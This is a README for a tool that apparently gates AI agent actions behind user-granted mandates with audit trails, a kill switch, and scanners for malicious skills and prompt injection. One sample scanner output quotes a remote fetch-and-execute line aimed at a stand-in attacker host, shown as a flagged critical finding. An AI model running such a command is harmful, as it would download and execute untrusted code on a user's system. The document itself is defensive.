# Agent Passport

Consent-gating for ALL sensitive agent actions. 75+ data-driven threat definitions with auto-updates. Like antivirus signature updates for your AI agent stack.

## What's new in v2.4.0: Real-Time Threat Definitions

All security patterns are now **data-driven** instead of hardcoded. Definitions load from a versioned JSON file at runtime, and Pro users get automatic updates every 6 hours from our threat intelligence API.

```bash
# Check your current definitions
mandate-ledger.sh definitions-status
# Version: 2026.02.26.1
# Scan patterns: 28
# Injection patterns: 20
# SSRF blocked hosts: 6
# Path traversal sequences: 7

# Update manually (or let auto-update handle it)
mandate-ledger.sh update-definitions

# Initialize definitions on first use
mandate-ledger.sh init-definitions
```

**Free tier:** Definitions update with each skill release. **Pro tier ($19/mo):** Definitions auto-update every 6 hours silently in the background. New patterns are available within hours of discovery. [Get Pro](https://agentpassportai.com/pro/)

### What's covered

| Shield | Patterns | What it catches |
|--------|----------|----------------|
| **Skill Scanner** | 28 scan patterns | Remote exec, base64 payloads, hardcoded secrets, cron persistence, SSH tampering |
| **Injection Shield** | 20 injection patterns | Instruction override, persona hijack, exfiltration, token manipulation |
| **SSRF Shield** | 6 blocked hosts + 6 schemes | Cloud metadata endpoints, private networks, dangerous protocols |
| **Path Traversal Guard** | 7 sequences | Directory traversal, URL-encoded variants |

Every scan and check stamps its output with `definitions_version` for full traceability.

## v2.3.0: ToxicSkills Defense

Snyk scanned 3,984 ClawHub skills in February 2026. 36% had security flaws, 13.4% had critical issues, and 76 confirmed malicious payloads were found.

### scan-skill

Run before installing anything from ClawHub:

```bash
mandate-ledger.sh scan-skill ./some-skill/

# CRITICAL (1):
#   File: scripts/setup.sh, Line 14
#   Match: curl https://evil.com/payload.sh | bash
#   Risk: Downloads and executes arbitrary remote code
#
# RESULT: UNSAFE - do NOT install this skill.
```

### check-injection

Scans inbound content before the agent processes it:

```bash
mandate-ledger.sh check-injection "$(cat email_body.txt)" --source email

# VERDICT: BLOCKED - content contains injection attempt(s)
```

Both commands work offline with bundled patterns. Pro users additionally get live pattern updates from the API.

---

## 30-Second Setup

```bash
# Initialize and register your agent
./mandate-ledger.sh init agent:my-assistant "Your Name" "personal assistant" "openclaw"

# Grant dev tool access (git, npm, docker, etc.)
./mandate-ledger.sh create-from-template dev-tools

# That's it! The agent will now check permissions before sensitive actions.
```

> **Templates available:** `dev-tools` · `email-team <domain>` · `file-ops <path>` · `web-research` · `safe-browsing` · `coding` · `email-assistant` · `read-only` · `full-auto`
> Run `./mandate-ledger.sh templates` to see all options.

## The Problem

AI agents need autonomy to be useful, but users need control to trust them.

Current approaches fail:
- **OS permissions** — too coarse (all files or none)
- **OAuth scopes** — static, no caps, no audit trail
- **Tool allowlists** — binary allow/deny, no nuance

Users hold back from granting agent autonomy because they can't constrain it.

## The Solution

**Agent Passport** provides dynamic, auditable, revocable mandates:

```
"I authorize [AGENT] to [ACTION] with [CONSTRAINTS] until [EXPIRY]"
```

Not just for purchases — for **all sensitive actions**:

| Category | What it covers |
|----------|----------------|
| 💳 **Financial** | Purchases, transfers, subscriptions |
| 📧 **Communication** | Emails, messages, tweets, posts |
| 🗑️ **Data** | Delete files, edit documents, database writes |
| ⚙️ **System** | Shell commands, package installs, configs |
| 🔌 **External API** | Third-party API calls with side effects |
| 👤 **Identity** | Public actions "as" the user |

Each mandate includes:
- **Scope constraints** — what targets are allowed
- **Caps/limits** — spending caps, rate limits
- **TTL** — automatic expiry
- **Audit trail** — what happened, when, under which mandate
- **Revocation** — instant stop

## Quick Example

```bash
# Create a mandate allowing email to company domain
./mandate-ledger.sh create '{
  "action_type": "communication",
  "agent_id": "agent:seb",
  "scope": {
    "allowlist": ["*@mycompany.com"],
    "rate_limit": "20/day"
  },
  "ttl": "2026-02-13T00:00:00Z"
}'

# Agent checks before sending
./mandate-ledger.sh check-action "agent:seb" "communication" "bob@mycompany.com"
# {"authorized": true, "mandate_id": "mandate_xxx"}

# After sending, log it
./mandate-ledger.sh log-action "mandate_xxx" 1 "Email to bob@mycompany.com"

# User can see everything
./mandate-ledger.sh audit
./mandate-ledger.sh summary
```

## User Experience

### Granting Permission
```
Agent: I'd like to help organize your inbox. This requires:
       📧 Send emails to your team (max 20/day)
       📄 Read your calendar
       
       [Approve for 7 days] [Customize] [Deny]
```

### Transparent Operation
```
Agent: Sent meeting reminder to sarah@company.com
       ✓ Within mandate: communication/email
       ✓ Recipient in allowlist
       ✓ 3/20 daily limit used
```

### Audit Trail
```
$ ./mandate-ledger.sh audit

📋 Recent actions:
  09:14 - Email sent to team@company.com (meeting notes)
  11:30 - Email sent to sarah@company.com (reminder)
  14:22 - Email BLOCKED to external@gmail.com (not in allowlist)
```

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                        User                                 │
│   "Send emails to my team, max 20/day, for 7 days"         │
└─────────────────────────┬───────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────┐
│                   Agent Passport                            │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │  Mandates   │  │    Audit    │  │     KYA     │         │
│  │   Ledger    │  │    Trail    │  │  Registry   │         │
│  └─────────────┘  └─────────────┘  └─────────────┘         │
└─────────────────────────┬───────────────────────────────────┘
                          │
        ┌─────────────────┼─────────────────┐
        ▼                 ▼                 ▼
┌───────────────┐ ┌───────────────┐ ┌───────────────┐
│   check →     │ │   check →     │ │   check →     │
│   ALLOW       │ │   ALLOW       │ │   DENY        │
│   log action  │ │   log action  │ │   (blocked)   │
│               │ │               │ │               │
│ team@co.com   │ │ sarah@co.com  │ │ ext@gmail.com │
└───────────────┘ └───────────────┘ └───────────────┘
```

## Modes

1. **Local** (default) — Mandates stored locally in `~/.openclaw/agent-passport/`. Free tier: fully offline. Pro tier: periodic API calls for license validation and threat definition updates.
2. **Preview** — Validation only, no storage
3. **Live (roadmap)** — Future connection to Agent Bridge for multi-agent sync (not yet implemented)

## Templates

- `dev-tools` - System dev commands with deny list protections, TTL 30d
- `email-team <domain>` - Communication scoped to `*@domain`, rate 50/day, TTL 30d
- `file-ops <path>` - Data operations in a path with secret/git denies, TTL 30d
- `web-research` - External API access to common model/dev APIs, rate 200/hour, TTL 30d
- `safe-browsing` - `external_api`, allowlist `google.com wikipedia.org github.com stackoverflow.com`, rate 30/hour, TTL 24h
- `coding` - `system`, allowlist `git npm node python pip cargo make docker`, rate 100/hour, TTL 7d
- `email-assistant` - `communication`, allowlist `all`, rate 20/hour, amount_cap 0, TTL 24h
- `read-only` - `data`, allowlist `read list cat ls`, rate 50/hour, TTL 24h
- `full-auto` - `system`, allowlist `all`, rate 200/hour, TTL 1d

## Kill Switch

Immediate freeze/unfreeze for all ledger operations:

```bash
./mandate-ledger.sh kill "suspicious behavior"
./mandate-ledger.sh unlock
```

When engaged, all commands are denied except `unlock`.

## Commands

```bash
# Mandates
create <json>              # Create mandate
get <mandate_id>           # Get by ID
list [filter]              # List (all|active|revoked|<action_type>)
revoke <mandate_id> [why]  # Revoke

# Authorization
check-action <agent> <type> <target> [amount]
log-action <mandate_id> <amount> [description]

# Audit
audit [limit]              # Recent entries
audit-mandate <id>         # For specific mandate
audit-summary [since]      # By action type
summary                    # Overall stats
export                     # Full JSON backup

# KYA (Know Your Agent)
kya-register <agent_id> <principal> <scope> [provider]
kya-get <agent_id>
kya-list
kya-revoke <agent_id> [why]

# Safety
kill <reason>              # Engage kill switch (freeze execution)
unlock                     # Disengage kill switch
```

## Agent Bridge (Coming Soon)

Local mode is the free tier. [Agent Bridge](https://agentbridge.dev) adds:

- **Multi-agent coordination** — prevent conflicting mandates
- **Cross-device sync** — same mandates on laptop/phone/server
- **Organization policies** — IT guardrails for enterprise
- **Compliance reporting** — audit exports for regulated industries
- **Merchant registry** — verified vendors, trust scores
- **Insurance integration** — mandates as proof of authorized scope

## Installation

Already included with OpenClaw. Just enable local mode:

```bash
export AGENT_PASSPORT_LOCAL_LEDGER=true
```

Or in OpenClaw config:
```json
{
  "skills": {
    "entries": {
      "agent-passport": {
        "env": {
          "AGENT_PASSPORT_LOCAL_LEDGER": "true"
        }
      }
    }
  }
}
```

## Why This Matters

**Trust is the bottleneck for agent adoption.**

Users want autonomous agents but fear giving them power. Agent Passport provides the missing middle ground:

- Not "do whatever" — constrained by mandate
- Not "ask every time" — pre-authorized within scope
- Full visibility — audit trail for accountability
- Instant off-switch — revoke anytime

**Agent Passport is how humans stay in control of increasingly capable agents.**

---

Built for [OpenClaw](https://openclaw.ai) | Upgrade to [Agent Bridge](https://agentbridge.dev)

---

**License:** MIT with Commons Clause. Free to use and modify. Commercial use of the software or the "Agent Passport" name requires a license. See [LICENSE](LICENSE) and [TRADEMARK.md](TRADEMARK.md).

Commercial licensing: legal@agentpassportai.com
